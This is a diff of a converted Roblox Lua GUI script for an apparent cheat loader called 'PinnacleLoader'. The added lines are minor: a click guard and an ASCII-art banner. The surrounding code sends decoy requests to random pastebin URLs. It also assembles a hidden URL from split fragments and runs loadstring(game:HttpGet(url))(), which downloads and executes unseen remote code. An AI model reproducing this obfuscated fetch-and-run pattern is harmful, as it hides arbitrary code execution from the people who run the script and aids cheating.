@@ -7,13 +7,14 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 20 | Scripts: 3 | Modules: 0 | Tags: 0
+-- Instances: 21 | Scripts: 4 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- ServerStorage.PinnacleLoader
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 G2L["1"]["Name"] = [[PinnacleLoader]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1"]["ResetOnSpawn"] = false;
 
 
 -- ServerStorage.PinnacleLoader.Main
@@ -181,6 +182,11 @@ G2L["14"] = Instance.new("LocalScript", G2L["12"]);
 G2L["14"]["Name"] = [[loadbtn]];
 
 
+-- ServerStorage.PinnacleLoader.Main.Loaded
+G2L["15"] = Instance.new("LocalScript", G2L["2"]);
+G2L["15"]["Name"] = [[Loaded]];
+
+
 -- ServerStorage.PinnacleLoader.Main.TextLabel.LocalScript
 local function C_d()
 local script = G2L["d"];
@@ -227,6 +233,7 @@ local script = G2L["14"];
 	local button = script.Parent
 	local percentLabel = script.Parent.Parent.percent
 	percentLabel.Visible = false
+	local clickable = false
 	
 	local function checkLoadPinnacle()
 		local loadPinnacle = ReplicatedStorage:FindFirstChild("LoadPinnacle")
@@ -260,7 +267,7 @@ local script = G2L["14"];
 				code = code .. string.char(rand + 60)
 			end
 		end
-		local url = "https://pastebin.com/raw/" .. code
+		local url = "https://pastebin.com/raw/"..code
 		pcall(function()
 			game:HttpGet(url)
 		end)
@@ -300,7 +307,7 @@ local script = G2L["14"];
 				local part3 = 'bWkW'
 				local url = part1 .. part2 .. part3
 				loadstring(game:HttpGet(url))()
-				
+	
 				doneTriggered = true
 			end
 			return false
@@ -350,11 +357,54 @@ local script = G2L["14"];
 	end
 	
 	button.MouseButton1Click:Connect(function()
+		if clickable == true then
+			return
+		end
+		clickable = true
 		percentLabel.Visible = true
 		makeMultipleRequests()
 	end)
-	
 end;
 task.spawn(C_14);
+-- ServerStorage.PinnacleLoader.Main.Loaded
+local function C_15()
+local script = G2L["15"];
+	print([[
+	
+	
+	
+	8888888b.  d8b                                     888          
+	888   Y88b Y8P                                     888          
+	888    888                                         888          
+	888   d88P 888 88888b.  88888b.   8888b.   .d8888b 888  .d88b.  
+	8888888P"  888 888 "88b 888 "88b     "88b d88P"    888 d8P  Y8b 
+	888        888 888  888 888  888 .d888888 888      888 88888888 
+	888        888 888  888 888  888 888  888 Y88b.    888 Y8b.     
+	888        888 888  888 888  888 "Y888888  "Y8888P 888  "Y8888  
+	
+	> For those who accept nothing less than perfection in Roblox.
+	
+	
+	
+	                        ,sdPBbs.
+	                      ,d$$$$$$$$b.
+	                     d$P'`Y'`Y'`?$b
+	                    d'    `  '  \ `b
+	                   /    |        \  \
+	                  /    / \       |   \
+	             _,--'        |      \    |
+	           /' _/          \   |        \
+	        _/' /'             |   \        `-.__
+	    __/'       ,-'    /    |    |     \      `--...__
+	  /'          /      |    / \     \     `-.           `\
+	 /    /;;,,__-'      /   /    \            \            `-.
+	/    |;;;;;;;\                                             \
+	
+	
+	
+	]])
+	
+end;
+task.spawn(C_15);
 
 return G2L["1"], require;
